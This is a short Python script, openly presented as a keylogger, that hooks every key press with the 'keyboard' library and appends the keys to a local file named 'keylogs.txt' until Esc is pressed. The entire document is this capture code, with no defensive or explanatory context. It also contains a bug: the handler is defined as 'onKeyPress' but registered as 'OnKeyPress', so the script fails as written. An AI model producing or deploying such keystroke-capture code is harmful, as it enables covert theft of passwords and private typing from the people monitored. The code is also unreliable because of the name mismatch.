```python
import keyboard

def onKeyPress(e):
    with open("keylogs.txt", "a") as f:
        if e.name == 'esc':
            print('[ESC] key was pressed, stopping the listener...')
            keyboard.unhook_all()
        elif e.name in ['space', 'enter']:
            f.write(f'[{e.name.upper()}] ')
        else:
            f.write(e.name)

try:
    print('Starting the keylogger...')
    keyboard.on_press(OnKeyPress)
    keyboard.wait()  # This will block until a KeyboardInterrupt (Ctrl+C) is raised
except Exception as e:
    print(f'An error occurred: {e}')
finally:
    print('Stopping the keylogger...')
```